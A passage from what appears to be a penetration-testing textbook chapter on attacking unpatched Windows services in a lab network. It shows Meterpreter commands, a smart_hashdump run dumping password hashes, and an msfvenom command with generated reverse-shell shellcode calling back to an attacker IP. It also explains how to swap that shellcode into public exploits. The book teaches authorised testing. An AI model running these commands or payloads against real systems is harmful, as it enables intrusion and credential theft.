    Command                   Description
    -------                   -----------
    ?                        Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background 
    channel                   Displays information or control active
    close                     Closes a channel
    detach                    Detach the meterpreter session 
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Open an interactive Ruby shell on the current 
Listing 7.5
The Meterpreter help screen
127
The Meterpreter shell payload
*** [OUTPUT TRIMMED] ***
Priv: Password database Commands
================================
    Command       Description
    -------       -----------
    hashdump      Dumps the contents of the SAM database
Priv: Timestomp Commands
========================
    Command       Description
    -------       -----------
    timestomp     Manipulate file MACE attributes
meterpreter >
Learning all of these features (or even most of them) is not necessary, but if it suits you,
I can recommend two awesome resources for diving deeper into the Meterpreter shell
than we do in this chapter. The first is the Metasploit Unleashed documentation from
Offensive Security, which is very detailed: http://mng.bz/emKQ. The second is a great
book called Metasploit: The Penetration Tester’s Guide—specifically, chapter 6, “Meter-
preter” (David Kennedy, Jim O’Gorman, Devon Kearns, and Mati Aharoni; No Starch
Press, 2011).
7.4.1
Useful Meterpreter commands
Now that you have a Meterpreter shell, what should you do first? When you get on a
new target, you should ask yourself, “What types of applications are running on this
system? What does the company use this system for? What users in the company are
currently using this system?” It turns out you can answer all three questions by using
the ps command, which works similarly to the Linux/UNIX ps command and lists all
the processes running on the affected target:
meterpreter > ps
Process List
============
 PID   PPID  Name                    Arch  Session  User                         
Path
 ---   ----  ----                    ----  -------  ----                         
----
 0     0     [System Process]                                                     
 4     0     System                  x64   0                                      
 252   4     smss.exe                x64   0        NT AUTHORITY\SYSTEM          
Listing 7.6
Typical output from the ps Meterpreter command
128
CHAPTER 7
Attacking unpatched services
\SystemRoot\System32\smss.exe
 272   460   spoolsv.exe             x64   0        NT AUTHORITY\SYSTEM          
*** [OUTPUT TRIMMED] ***
 2104  332   rdpclip.exe             x64   2        CAPSULECORP\tien            
C:\Windows\system32\rdpclip.exe                      
 2416  1144  userinit.exe            x64   2        CAPSULECORP\tien             
C:\Windows\system32\userinit.exe
 2428  848   dwm.exe                 x64   2        CAPSULECORP\tien             
C:\Windows\system32\Dwm.exe
 2452  2416  explorer.exe            x64   2        CAPSULECORP\tien             
C:\Windows\Explorer.EXE
 2624  2452  tvnserver.exe           x64   2        CAPSULECORP\tien             
C:\Program Files\TightVNC\tvnserver.exe              
 2696  784   audiodg.exe             x64   0                                      
 2844  1012  SearchProtocolHost.exe  x64   2        CAPSULECORP\tien             
C:\Windows\system32\SearchProtocolHost.exe
 2864  1012  SearchFilterHost.exe    x64   0        NT AUTHORITY\SYSTEM          
C:\Windows\system32\SearchFilterHost.exe
meterpreter >
From this output, you can see that not much other than default Windows processes
are running on this host, with the exception of a TightVNC server running as process
ID (PID) 2624. Interestingly, you’ll also notice that there appears to be an Active
Directory user named tien logged in to this system. This is obvious from the processes
running as CAPSULECORP\tien. PID 2104 is named rdpclip.exe and is running as the
CAPSULECORP\tien user. That tells us that this user account is logged in remotely via
Windows RDP. It may be possible to obtain the user’s Active Directory domain creden-
tials using this Meterpreter session. Let’s put a pin in that for now and come back to it
later; I want to show you a few more tricks you can do with your Meterpreter shell.
 To achieve code execution via Meterpreter, simply type the shell command, and
you’ll be dropped into an OS command prompt. This is useful, of course, but it may
not seem exciting because you already had command execution via the reverse TCP
shell. That’s fine; I just wanted to show you how to do it. You can type exit to termi-
nate the command shell, but this time you’re been placed back into your Meterpreter
shell:
meterpreter > shell
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.
C:\Windows\system32>exit
exit
meterpreter >
The fact that you can enter into a shell, back out of it, and re-enter again without los-
ing connectivity to your target is enough to make the Meterpreter shell one of my
favorite payloads. And you can do a lot more with a Meterpreter shell that isn’t accessi-
ble with a simple command shell. Remember those local user account password
Windows 
RDP process 
running as a 
domain user
This server is running TightVNC, a
non-standard Windows service.
129
The Meterpreter shell payload
hashes from the database server? You need to grab those from this system as well, and
you can do so using what’s called a Meterpreter post module. 
DEFINITION
In the next chapter, you learn a lot more about post exploitation:
things an attacker does on a compromised system after it has been compro-
mised. Post modules are Metasploit modules that you can use once you have
obtained a Meterpreter shell connection to a compromised target. As the
name suggests, they are used during post exploitation.
At the time of writing this chapter, Metasploit has over 300 post modules, so there is
likely to be one for just about any scenario you can think of. To run a post module, type
the run command followed by the path of the module. For example, run post/
windows/gather/smart_hashdump runs the smart_hashdump module. One of the great
things about this post module is that it automatically stores the hashes in the MSF data-
base if you have configured the database according to the instructions in appendix A,
section A.5.3. It also stores them in a .txt file located in the ~/.msf4 directory. 
meterpreter > run post/windows/gather/smart_hashdump
[*] Running module against TIEN 
[*] Hashes will be saved to the database if one is connected.
[+] Hashes will be saved in loot in JtR password file format to:
[*] /~/.msf4/loot21522_default_10.0.10.208windows.hashes_755293.txt 
[*] Dumping password hashes...
[*] Running as SYSTEM extracting hashes from registry
[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY 5a7039b3d33a1e2003c19df086ccea8d
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[*] Dumping password hints...
[+] tien:"Bookstack"                   
[*] Dumping password hashes...
[+]
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d
e0c089c0:::
[+]
HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:6769dd01f1f8b61924785
de2d467a41:::
meterpreter > 
In the next chapter, you’ll see just how useful these Windows account password hashes
can be for gaining access to additional systems. I refer to these as level-two targets because
they were not accessible before—the vulnerabilty-discovery phase didn’t yield any
low-hanging-fruit for these specific hosts. In my experience, once you get to level two on
an INPT, it’s not long until you can take over the entire network. Before wrapping up
Listing 7.7
Using the smart_hashdump post module
Hostname of the system against 
which you’re running the module
Location of the
file in which
your hashes
will be stored
Sometimes system administrators 
put useful information in the 
password hint.
130
CHAPTER 7
Attacking unpatched services
this chapter, I want to briefly cover the public exploit database, which is another useful
resource outside of the Metasploit framework where you can sometimes find working
exploits to compromise targets in your engagement scope.
7.5
Cautions about the public exploit database
You have already heard about the public exploit database, exploit-db.com; we talked
about it a little in section 4.2. There you will find thousands of proof-of-concept
exploits for publically disclosed vulnerabilities. These exploits vary in complexity and
reliability and are not as regulated and quality-tested as exploit modules you’ll find in
the Metasploit framework. You may find exploits with broken or even malicious shell-
code on websites like this.
 For that reason, you should be extremely cautious about using anything you down-
load from exploit-db.com on your INPT. In fact, I advise against using exploit-db.com
unless you feel confident enough to read the source code and understand what it is
doing. Additionally, you should never trust the shellcode portion of the exploit: this is
the hexadecimal machine language instructions that spawn your reverse shell once
you trigger the exploit. If you must use an exploit from exploit-db.com to penetrate a
vulnerable target, then you absolutely have to understand how to replace the shell-
code with your own. The following subsection explains how to do it.
NOTE
This book does not attempt to cover all the ins and outs of software
exploitation. This is intentional because in a typical INPT, you won’t have
time to test and develop custom exploits. Professional pentesters are always
racing against a clock set by the scope of their engagement and therefore rely
on reliable field-tested frameworks such as Metasploit the majority of the
time. Section 7.5 is intended to offer you a short glimpse into custom exploit
scripts to pique your curiosity. If you want to learn more, the internet is full of
useful information; as I mentioned earlier, I suggest you begin by reading the
first hacking book I ever read: Erickson’s Hacking: The Art of Exploitation. 
7.5.1
Generating custom shellcode
First you need to generate the shellcode that you want to use. To accomplish this, you
can use a tool called msfvenom that’s packaged in the Metasploit framework. In the
MS17-010 example, we used the windows/x64/meterpreter/reverse_https payload
Exercise 7.1: Compromising tien.capsulecorp.local
Using the windows.txt file you created in exercise 3.1, sweep for targets missing the
MS17-010 patch. You should discover that the tien.capsulecorp.local system is
reportedly missing the patch. Use the ms17_010_eternalblue exploit module along
with the meterpreter/reverse_tcp payload to exploit the vulnerable host and get a
remote shell. There is a file in tien’s desktop folder called flag.txt.
What is in the file? You can find the answer in appendix E.
131
Cautions about the public exploit database
with our exploit. So I’ll assume you want to use the same payload to generate your cus-
tom shellcode. I’m also going to assume that you have found an exploit from exploit
-db.com that is written in the Python programming language and that you want to try
to use it against a potentially vulnerable target.
 Here is how you can create custom shellcode for that exploit. Open a new terminal win-
dow or, better yet, create a new tmux window by pressing CTRL-b, c, and type the following
command from within the metasploit-framework/ directory: ./msfvenom -p windows/
x64/meterpreter/reverse_https LHOST=10.0.10.160 LPORT=443 --platform Windows
-f python. This command will create shellcode for the reverse_https Meterpreter payload,
specified to connect back to 10.0.10.160 on port 443, optimized for Windows systems, and
compatible with the Python programming language.
./msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.10.160
LPORT=443 --platform Windows -f python
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 673 bytes
Final size of python file: 3275 bytes
buf =  b""  
buf += b"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41"
buf += b"\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48"
buf += b"\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f"
buf += b"\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c"
buf += b"\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52"
buf += b"\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66"
*** [OUTPUT TRIMMED] ***
buf += b"\xc1\x88\x13\x00\x00\x49\xba\x44\xf0\x35\xe0\x00\x00"
buf += b"\x00\x00\xff\xd5\x48\xff\xcf\x74\x02\xeb\xaa\xe8\x55"
buf += b"\x00\x00\x00\x53\x59\x6a\x40\x5a\x49\x89\xd1\xc1\xe2"
buf += b"\x10\x49\xc7\xc0\x00\x10\x00\x00\x49\xba\x58\xa4\x53"
buf += b"\xe5\x00\x00\x00\x00\xff\xd5\x48\x93\x53\x53\x48\x89"
buf += b"\xe7\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\x00\x20\x00"
buf += b"\x00\x49\x89\xf9\x49\xba\x12\x96\x89\xe2\x00\x00\x00"
buf += b"\x00\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb2\x66\x8b"
buf += b"\x07\x48\x01\xc3\x85\xc0\x75\xd2\x58\xc3\x58\x6a\x00"
buf += b"\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5"    
This shellcode can be trusted to return a reverse_https Meterpreter payload to the
IP address you specified on the listening port you specified. Next, you find the shell-
code that’s currently in the exploit you want to use and replace it with the code you
just generated. For example, if you were trying to use exploit 47468 ASX to MP3 con-
verter 3.1.3.7 - ‘.asx’ Local Stack Overflow (DEP) (chosen completely at random just to
demonstrate the concept), you would highlight the shellcode portion of the exploit,
delete it, and then replace it with the shellcode you generated using msfvenom (see
figure 7.1).
Listing 7.8
Generating custom shellcode with msfvenom
Begin selecting shellcode.
End of 
shellcode
132
CHAPTER 7
Attacking unpatched services
Now you are free to test this exploit against your potentially vulnerable target and feel
confident that if the exploit succeeds, you will get a reverse shell. Again, this section
was provided merely for illustrative purposes; customizing exploit shell code is rarely
something you’ll consider on a typical INPT.
Summary
 Exploits are computer programs written by security researchers that take
advantage of unpatched software bugs and can be used to compromise vulnerable
targets.
 Enterprise networks often fail to patch 100% of their computer systems due to
poor asset management and a lack of visibility into all of the computer systems
connected to the network.
 MS17-010 was the tenth security update to be released by Microsoft in the year
2017 and was codenamed Eternal Blue. If a system is missing this patch, it’s easy
to find and is considered a quick win for a pentester.
 The Meterpreter shell is a much more robust payload than a standard Windows
command shell and offers additional functionality such as post modules, which
can be used to assist during an INPT.
 Using exploits from exploit-db.com can be risky. Be sure you know what you are
doing, and always generate your own shellcode to replace what’s in the public
exploit.
Replace with
your shellcode
Figure 7.1
Shellcode section of exploit 47468
Phase 3
Post-exploitation
 and privilege escalation
Having established access into your target network environment by com-
promising vulnerable hosts, it’s time to reach the next level. This part of the
book is all about what network attackers do after they’ve compromised a target
system. 
 In chapter 8, you’ll learn the critical components of post-exploitation, includ-
ing how to maintain reliable entry, harvest credentials, and move laterally. This
chapter focuses specifically on Windows techniques. Chapter 9 covers the same
post-exploitation key components but on Linux systems. You’ll learn where to
search for sensitive information, including configuration files and user prefer-
ences, and also how to set up an automated reverse-shell callback job using
crontab.
 Finally, in chapter 10, you’ll elevate your access to that of a domain admin
user. Once you have access to the domain controller, you can browse volume
shadow copies for protected files. You’ll learn how to obtain privileged creden-
tials from Windows by exporting all of the Active Directory password hashes
from the ntds.dit file. When you are finished with this part of the book, you will
have completely taken control of your target enterprise network environment.
135
Windows
 post-exploitation
Now that our movie heist crew has successfully broken into or penetrated several
areas of their target facility, it’s time for them to move on to the next phase of their
engagement. Smash into the vault room, grab the jewels, and run? No, not quite
yet. That would cause a lot of commotion, and they would probably get caught.
Their plan instead is to blend in with the workers at the facility and slowly remove
incrementally larger amounts of loot without arousing suspicions before eventually
disappearing without a trace. At least, that’s the best-case scenario they are hoping
for. In a movie, they will most likely make a mistake eventually for the sake of plot
thickness. 
This chapter covers
 Maintaining persistent Meterpreter access
 Harvesting domain-cached credentials
 Extracting clear-text credentials from memory
 Searching the filesystem for credentials in 
configuration files
 Using Pass-the-Hash to move laterally
136
CHAPTER 8
Windows post-exploitation
 Nonetheless, the next thing they need to concern themselves with is how to move
freely throughout the compound and come and go as they please. They might steal
uniforms from a supply closet so they look the part, create fake employee records in